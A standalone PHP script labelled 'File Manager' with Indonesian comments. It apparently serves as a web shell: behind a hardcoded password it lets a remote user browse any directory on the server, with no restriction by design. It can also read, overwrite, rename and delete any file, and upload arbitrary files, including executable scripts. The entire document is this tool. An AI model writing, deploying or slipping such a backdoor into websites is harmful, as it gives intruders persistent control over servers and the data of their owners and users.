<?php
session_start();

// 🔐 Password proteksi
$password = 'Apalah2189';
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['password'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: ?"); exit;
    }
    echo "<form method='POST'><h2>Login</h2><input type='password' name='password' placeholder='Password'><br><button>Login</button></form>";
    exit;
}

// 🔓 Tidak ada batasan direktori
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !file_exists($path)) {
    die("❌ Path tidak valid.");
}

// Fungsi tampil
function list_dir($path) {
    $files = @scandir($path);
    if (!$files) { echo "❌ Tidak bisa buka direktori."; return; }

    echo "<h2>📁 $path</h2>";
    if ($path != '/') {
        echo "<a href='?path=" . urlencode(dirname($path)) . "'>⬅️ Atas</a> | ";
    }
    echo "<a href='?path=" . urlencode($path) . "&upload=1'>📤 Upload File</a><br><br>";
    echo "<table border='1' cellpadding='5'>";
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $file;
        $href = urlencode($full);
        echo "<tr><td>$file</td><td>";
        if (is_dir($full)) {
            echo "<a href='?path=$href'>📁 Buka</a>";
        } else {
            echo "<a href='?path=" . urlencode($path) . "&edit=$href'>✏️ Edit</a>";
        }
        echo " | <a href='?path=" . urlencode($path) . "&rename=$href'>📝 Rename</a>";
        echo " | <a href='?path=" . urlencode($path) . "&delete=$href' onclick=\"return confirm('Yakin hapus $file?')\">🗑️ Delete</a>";
        echo "</td></tr>";
    }
    echo "</table>";
}

function edit_file($file) {
    if (!is_file($file)) die("❌ File tidak valid.");
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "<p>✅ Disimpan.</p><a href='?path=" . urlencode(dirname($file)) . "'>Kembali</a>";
        return;
    }
    $content = htmlspecialchars(file_get_contents($file));
    echo "<h3>Edit: $file</h3>";
    echo "<form method='POST'><textarea name='content' rows='20' cols='100'>$content</textarea><br><button type='submit'>Simpan</button></form>";
}

function rename_file($file, $path) {
    if (!file_exists($file)) die("❌ Tidak ditemukan.");
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $new = $path . DIRECTORY_SEPARATOR . basename($_POST['newname']);
        rename($file, $new);
        echo "<p>✅ Diubah.</p><a href='?path=" . urlencode($path) . "'>Kembali</a>";
        return;
    }
    echo "<h3>Rename: $file</h3><form method='POST'>";
    echo "<input name='newname' value='" . basename($file) . "'><br><button>Rename</button></form>";
}

function delete_file($file, $path) {
    if (is_dir($file)) {
        rmdir($file);
    } elseif (is_file($file)) {
        unlink($file);
    }
    echo "<p>🗑️ Dihapus.</p><a href='?path=" . urlencode($path) . "'>Kembali</a>";
}

function upload_file($path) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        move_uploaded_file($_FILES['file']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
        echo "<p>✅ Upload selesai.</p><a href='?path=" . urlencode($path) . "'>Kembali</a>";
        return;
    }
    echo "<h3>Upload ke: $path</h3>";
    echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file'><br><button>Upload</button></form>";
}

// HTML output
echo "<!doctype html><html><head><title>File Manager</title></head><body>";

if (isset($_GET['edit'])) {
    edit_file($_GET['edit']);
} elseif (isset($_GET['rename'])) {
    rename_file($_GET['rename'], $path);
} elseif (isset($_GET['delete'])) {
    delete_file($_GET['delete'], $path);
} elseif (isset($_GET['upload'])) {
    upload_file($path);
} else {
    list_dir($path);
}

echo "</body></html>";
?>
